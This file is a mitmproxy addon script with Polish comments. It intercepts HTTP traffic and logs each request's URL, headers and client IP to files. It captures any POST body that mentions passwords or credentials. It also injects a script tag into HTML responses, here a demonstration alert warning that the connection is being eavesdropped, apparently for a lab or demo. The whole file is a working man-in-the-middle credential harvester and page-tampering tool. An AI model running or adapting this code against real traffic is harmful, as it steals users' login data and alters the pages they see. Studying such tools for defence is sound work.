import json
import os
from datetime import datetime

from mitmproxy import http, ctx

# Konfiguracja
LOG_DIR = "/app/logs"
os.makedirs(LOG_DIR, exist_ok=True)


class Interceptor:
    def __init__(self) -> None:
        self.request_count = 0
        self.captured_credentials = []

    def request(self, flow: http.HTTPFlow) -> None:
        self.request_count += 1

        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "method": flow.request.method,
            "url": flow.request.pretty_url,
            "headers": dict(flow.request.headers),
            "client_ip": flow.client_conn.address[0] if flow.client_conn and flow.client_conn.address else None,
        }

        # Przechwytywanie danych logowania w POST
        if flow.request.method == "POST":
            try:
                content = flow.request.get_text()
                log_entry["body"] = content

                if "password" in content.lower() or "credentials" in content.lower():
                    self.captured_credentials.append(log_entry)
                    ctx.log.warn(f"[!] Potential credentials: {content[:100]}")
            except Exception as e:
                ctx.log.info(f"Error reading request body: {e}")

        # Zapis logu żądania
        with open(f"{LOG_DIR}/requests.log", "a") as f:
            f.write(json.dumps(log_entry) + "\n")

        ctx.log.info(f"Request #{self.request_count}: {flow.request.pretty_url}")

    def response(self, flow: http.HTTPFlow) -> None:
        # Modyfikacja HTML + logowanie odpowiedzi
        try:
            if flow.response.status_code == 200:
                content_type = flow.response.headers.get("content-type", "")
                if "text/html" in content_type and flow.response.content:
                    injection = """
<script>
alert("MITM: Twoje połączenie jest podsłuchiwane!");
</script>
"""

                    # Pobierz HTML jako tekst
                    html = flow.response.get_text()

                    # Wstrzyknij tuż ZA <body>
                    if "<body>" in html:
                        html = html.replace("<body>", "<body>" + injection, 1)
                    else:
                        # awaryjnie: dołóż na początek
                        html = injection + html

                    # Zapisz zmodyfikowaną odpowiedź
                    flow.response.set_text(html)
                    ctx.log.warn("[!] HTML content modified (alert injected)")
        except Exception as e:
            ctx.log.info(f"Error modifying response: {e}")

        # Logowanie odpowiedzi
        try:
            response_size = len(flow.response.content) if flow.response.content else 0
        except Exception:
            response_size = 0

        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "url": flow.request.pretty_url,
            "status": flow.response.status_code,
            "response_size": response_size,
        }

        with open(f"{LOG_DIR}/responses.log", "a") as f:
            f.write(json.dumps(log_entry) + "\n")


addons = [Interceptor()]
